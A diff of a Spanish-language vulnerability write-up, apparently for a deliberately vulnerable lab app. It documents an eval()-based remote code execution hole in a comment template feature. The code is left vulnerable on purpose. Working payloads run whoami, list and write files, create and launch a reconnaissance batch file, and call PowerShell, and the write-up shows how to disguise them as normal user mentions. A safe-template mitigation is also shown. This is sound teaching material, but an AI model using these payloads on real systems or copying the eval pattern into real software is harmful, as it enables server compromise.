@@ -140,28 +140,45 @@ db.get('SELECT * FROM usuarios WHERE username = ? AND password = ?', [username, 
 
 ---
 
-### **3. � Vulnerabilidad RCE (Remote Code Execution)**
+### **3. 🚨 Vulnerabilidad RCE (Remote Code Execution)**
 
 #### **🎯 Ubicación:**
-- Sistema de comentarios (`/api/comentarios`)
-- Procesamiento de plantillas en el backend
+- Sistema de comentarios con plantillas dinámicas (`/api/comentarios`)
 
 #### **📝 Descripción:**
-El backend procesa los comentarios usando un sistema de plantillas vulnerable que utiliza `eval()` para evaluar expresiones JavaScript. Esto permite que un atacante inyecte código JavaScript malicioso que se ejecutará en el servidor Node.js.
+El sistema de comentarios incluye una funcionalidad de **"referencias a usuarios"** que permite mencionar a otros usuarios que han interactuado con el documento. Los usuarios pueden usar variables como `{{uploader}}` para mencionar quien subió el archivo, `{{firstCommenter}}` para el primer comentarista, etc. Esta funcionalidad está implementada usando `eval()` para "flexibilidad", lo que permite la ejecución de código JavaScript arbitrario.
+
+#### **🤔 ¿Por qué un desarrollador haría esto?**
+Esta vulnerabilidad es **muy realista** porque:
+
+**Solicitud simple de UX:**
+- Los usuarios pidieron poder "mencionar" a otros usuarios en comentarios
+- Era común escribir "Gracias Juan por subir esto" y querían automatizarlo
+- El PM quería que fuera "dinámico" como `{{uploader}}` en lugar de texto fijo
+
+**Decisión técnica aparentemente simple:**
+- El desarrollador pensó: "Es solo reemplazar algunas variables, uso eval() para flexibilidad"
+- Se consideró "funcionalidad básica" sin implicaciones de seguridad
+- La lógica era: "solo admins comentan, es seguro"
+- Deadline corto, se priorizó funcionalidad sobre seguridad
 
 #### **🔓 Código vulnerable:**
 ```javascript
-// Plantilla vulnerable que permite JavaScript injection
-function procesarComentario(texto, autor) {
-  const template = `
-    <div class="comentario">
-      <strong>${autor}:</strong> ${texto}
-      <small>Fecha: \${new Date().toLocaleString()}</small>
-    </div>
-  `;
-  
-  // VULNERABILIDAD: eval() permite ejecución de código JavaScript arbitrario
-  return eval('`' + template + '`');
+// Sistema de referencias a usuarios - VULNERABLE
+let comentario = comentario.comentario;
+
+// Referencias básicas (SEGURO)
+comentario = comentario
+  .replace(/\{\{uploader\}\}/g, uploader)
+  .replace(/\{\{firstCommenter\}\}/g, firstCommenter)
+  .replace(/\{\{previousCommenter\}\}/g, previousCommenter);
+
+// CRÍTICO: Procesar "referencias avanzadas" (VULNERABLE)
+if (comentario.includes('{{') && comentario.includes('}}')) {
+  comentario = comentario.replace(/\{\{([^}]+)\}\}/g, (match, ref) => {
+    // VULNERABILIDAD: eval() para "flexibilidad de referencias"
+    return eval(ref); // ¡Ejecuta cualquier código JavaScript!
+  });
 }
 ```
 
@@ -174,73 +191,79 @@ function procesarComentario(texto, autor) {
 - Contraseña: `admin123`
 
 **Paso 2: Ir a "Ver documentos"**
-- Seleccionar cualquier archivo
-- Usar el formulario de comentarios
+- Seleccionar cualquier archivo PDF
+- Observar las instrucciones de plantillas dinámicas
 
-**Paso 3: Inyectar payload JavaScript**
+**Paso 3: Explotar usando expresiones "matemáticas"**
 - En lugar de un comentario normal, inyectar código malicioso
 
-#### **💀 Payloads de ejemplo:**
+#### **💀 Payloads sutiles (disfrazados como referencias de usuarios):**
 
-**Ejemplo 1: Reconocimiento del sistema**
-```javascript
-\${process.platform} \${process.version} \${require('os').hostname()}
+**Ejemplo 1: "Información del usuario del servidor" (reconocimiento)**
+```
+Gracias {{uploader}} por subirlo. Info técnica: {{process.platform}} {{process.version}}
 ```
 
-**Ejemplo 2: Ejecución de comandos**
-```javascript
-\${require('child_process').execSync('whoami').toString()}
+**Ejemplo 2: "Validación del proceso" (identificación del usuario del servidor)**
+```
+Respondo a {{previousCommenter}} - Proceso verificado por: {{require('child_process').execSync('whoami').toString().trim()}}
 ```
 
-**Ejemplo 3: Listado de archivos**
-```javascript
-\${require('fs').readdirSync('.').join(', ')}
+**Ejemplo 3: "Listado de archivos relacionados" (enumeración)**
+```
+Como dice {{firstCommenter}}, archivos relacionados: {{require('fs').readdirSync('.').slice(0,3).join(', ')}}
 ```
 
-**Ejemplo 4: Creación de archivo**
-```javascript
-\${require('fs').writeFileSync('hacked.txt', 'Sistema comprometido!')}
+**Ejemplo 4: "Log de actividad" (creación de evidencia)**
+```
+Seguimiento para {{uploader}}: {{require('fs').writeFileSync('activity.log', 'User accessed file: ' + new Date())}} ✓ Registrado
 ```
 
-**Ejemplo 5: Backdoor para Windows**
-```javascript
-\${require('fs').writeFileSync('backdoor.bat', '@echo off\\necho === BACKDOOR ACTIVO ===\\nwhoami\\nhostname\\nipconfig\\ndir C:\\\\Users\\npause')} \${require('child_process').exec('backdoor.bat')}
+**Ejemplo 5: "Script de mantenimiento" (backdoor sutil)**
+```
+{{uploader}} necesita verificar esto: {{require('fs').writeFileSync('maint.bat', '@echo off\\necho Sistema OK\\nwhoami\\nhostname\\ndir')}}, ejecutando {{require('child_process').exec('maint.bat')}} ✓
 ```
 
-#### **🔍 Explicación del Ejemplo 5:**
-Este payload es especialmente peligroso porque:
-1. **Crea un archivo .bat** con comandos de reconocimiento del sistema
-2. **Lo ejecuta automáticamente** en el servidor Windows
-3. **Recopila información** como usuario actual, nombre del equipo, configuración de red
-4. **Lista directorios** para mapear la estructura del sistema
-5. **Deja una pausa** para poder ver la salida antes de que se cierre
+#### **🎭 ¿Por qué estos payloads son especialmente sutiles?**
 
-El archivo `backdoor.bat` creado contiene:
-```batch
-@echo off
-echo === BACKDOOR ACTIVO ===
-whoami
-hostname
-ipconfig
-dir C:\Users
-pause
+1. **Contexto conversacional**: Parecen respuestas normales a otros usuarios
+2. **Referencias legítimas**: Usan las variables correctas como `{{uploader}}`, `{{previousCommenter}}`
+3. **Flujo natural**: Se leen como comentarios reales de trabajo
+4. **Justificación técnica**: Las "verificaciones" parecen parte del proceso normal
+5. **Camuflaje perfecto**: Un admin usaría esto pensando que está mencionando usuarios
+
+**Ejemplo real de ataque encubierto:**
+```
+Hola {{uploader}}, gracias por subir este documento importante.
+{{previousCommenter}} tenía razón sobre la verificación.
+Proceso completado: {{require('child_process').exec('powershell -c "Get-Process | Out-File processes.txt"')}} ✓
+Sistema validado para {{firstCommenter}}: {{require('fs').writeFileSync('c:/temp/access.log', 'SYSTEM_ACCESS_' + Date.now())}} ✓
 ```
 
+Este comentario parece una conversación normal pero ejecuta comandos maliciosos.
 #### **🛡️ Mitigación:**
 ```javascript
 // NUNCA usar eval() con datos de usuario
-// Usar sanitización y escape de HTML
-function procesarComentario(texto, autor) {
-  const textoEscapado = texto.replace(/[<>&"']/g, (char) => {
-    return {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#x27;'}[char];
+// Implementar plantillas de forma segura usando whitelist
+function procesarPlantillasSeguras(comentario, usuario, archivo) {
+  // Solo variables predefinidas y controladas
+  const variables = {
+    username: usuario.username,
+    fecha: new Date().toLocaleDateString('es-ES'),
+    archivo: archivo,
+    autor: usuario.username
+  };
+  
+  // Reemplazar solo variables permitidas
+  let procesado = comentario;
+  Object.keys(variables).forEach(key => {
+    const regex = new RegExp(`\\{\\{${key}\\}\\}`, 'g');
+    procesado = procesado.replace(regex, variables[key]);
   });
   
-  return `
-    <div class="comentario">
-      <strong>${autor}:</strong> ${textoEscapado}
-      <small>Fecha: ${new Date().toLocaleString()}</small>
-    </div>
-  `;
+  // Para expresiones matemáticas, usar un evaluador seguro
+  // como math.js en lugar de eval()
+  return procesado;
 }
 ```
 
